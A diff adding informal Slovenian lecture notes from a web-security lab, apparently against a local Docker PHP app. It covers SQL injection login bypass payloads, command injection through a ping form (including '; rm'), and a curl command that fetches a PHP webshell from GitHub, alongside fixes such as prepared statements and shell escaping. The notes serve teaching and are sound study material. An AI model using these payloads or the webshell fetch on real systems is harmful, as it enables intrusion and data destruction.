@@ -1,0 +1,83 @@
+web_1
+
+
+sql injection -> v ta string, ki predstavlja SQL stavek, lahko sami notr vnašamo stvari da zmanipuliramo sam SQL stavek
+
+probamo porint notr naš stavek, da nam bo poizvedba v prid.
+
+select id, user from users where password = 'password'
+
+'password' del lahko zmanipuliramo v 'password' OR 1=1 --' // -- je komentar, da se potem tist ' sam preskoči (drgač bi bil syntax error ker mamo ' na koncu ane z prvim našim ' escapamo ampak se zmer ta en ' na konc doda ker je to naš "password" input.
+
+laufi z sudo
+
+docker run --rm hello-world
+
+docker compose up -d
+
+docker ps //vids kontejnerje
+
+varprog-test ma pod ports napisan še neki -> php laufa na portu 80 (HTTP) torej če mi mamo localhost na 8080 bo on redirectu na http znotri kontejnarja: localhost:8080 potem dobimo nas screen
+
+prvi file, ki se na rootu zalaufa -> index.php
+
+php se laufa na serverju, v responsih vidmo html samo (php pač štima kako zgleda hmtl )
+
+
+
+HTTP vidmo da se gleda POST, ki ga form objavi
+
+kaj že get in post delata?
+
+GET -> ma request headerje, ki jih posle client (GET /../..). server odgovri z response headers (200 ok) in body (dokument html)
+
+POST -> ma isto request headerje in tut request body
+
+
+$sql je string v katerga konkateniramo naše podatke
+
+pol pogledamo če kej vrne in v sejo naredi (PHPSESSID je cookie za sejo)
+
+header('Location: admin.php') //redirecta na admin.php, ko si loginan
+
+kaj bomo injectal? v username del bomo dal 'OR 1=1#
+
+nova koda: WHERE username = ''OR 1=1 #' AND PASSWORD ='qwe'
+
+samo kako pa da bi se v admina garantirano loginal (samo admin uporabnika in ne cele baze, kot to zgorej)
+
+admin' # daš (password bo sam ignoriral)
+
+kako se rešimo tega? v PHP maš prepared statements, s samo konkatenacijo lahko pa escapanje uporabiš! to je najbolš k gre use u pizdo inn nimaš drugih rešitev(torej nam najbližja rešitev z trenutno kodo), rešitev je pa tud ORM (maš strukturo z katero delaš, ne z SQL stringi)
+
+injection je karkol, kamor mi neki vnesemo in zmanipuliramo ta vnos (ni nujno SQL!)
+
+ok zdej smo na admin page-u in mamo nek IP pinger
+
+vidmo da se shell požene z našim post ip parametrom
+problem? loh spremenimo ukaz lupine
+
+ping -c 4 1.1.1.1 in damo še podpičje ; in nek drug ukaz
+ping -c 4; ls // napišemo ; ls     ping bo failu ampak nima veze, ls se bo sezmer izvedu
+
+loh recimo klicemo ; rm phpinfo.php
+
+lmfao in loh removamo
+
+php webshell github
+
+; curl -o https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/c871f130a12e97090a08d0ab855c1b7a93ef1150/easy-simple-php-webshell.php
+
+
+in zdj mamo shell php in loh gremo v njega localhost:8080/shell.php in loh izvajamo ukaze notr
+
+to so shell injectioni!!!!!
+
+kako popravimo? najlažje: shell escaping (v php je funkcija za to)
+
+druge rešitve? exec ["ping", "-c" , "4", $ip] sam to loh sezmer neki exploitaš. recimo če bi namest ping mel curl bi loh klical file:///etc/passwd loh sezmer das to in mas sezmer pizdarijo ceprov nisi escapov
+
+
+
+
+
